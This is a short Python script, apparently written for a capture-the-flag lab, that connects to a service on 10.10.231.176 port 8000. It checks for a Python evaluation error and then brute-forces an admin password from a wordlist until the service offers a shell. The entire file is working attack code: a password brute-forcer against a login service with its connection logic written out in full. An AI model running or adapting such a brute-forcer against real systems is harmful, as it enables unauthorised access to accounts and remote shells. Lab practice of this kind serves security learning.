#!/usr/bin/python3 

import socket
import sys
import time
import os



def main():
	if len(sys.argv) != 2:
		print('Usage: [X] <exploit.py> <pathToWordlist>')
		sys.exit(0)

main()
	
def brute():
	try:
		timer = 0
		s = socket.socket()
		s.connect(('10.10.231.176', 8000))
		s.send(b'admin')
		wordlist = open(sys.argv[1], 'r')
		for word in wordlist:
			timer = timer + 1
			word = word.strip()
			time.sleep(1)
			print('Trying:', word)
			response = s.recv(1024).decode()
			print(response)
			s.send(word.encode())
			if 'Welcome Admin!!! Type "shell" to begin' in response:
				print(word, timer)
				break
			elif (timer % 3 == 0):
				s.send(b'admin')

	except socket.error as error:
		print(error)



try:
	s = socket.socket()
	s.connect(('10.10.231.176', 8000))
	s.send(b'test')
	if "'test' is not defined" in s.recv(1024).decode():
		for w in 'Connection Successful. Attempt exploit? Y/n\n\r':
			time.sleep(0.015)
			sys.stdout.write('{}'.format(w))
			sys.stdout.flush()
		dec = input().lower()
		if dec == 'y':
			s.close()
			brute()
		else:
			sys.exit(0)

	else:
		for w in 'Connection Failed':
			time.sleep(0.015)
			sys.stdout.write('{}'.format(w))
			sys.stdout.flush()
		print('\n')
except socket.error as error:
	print(error)



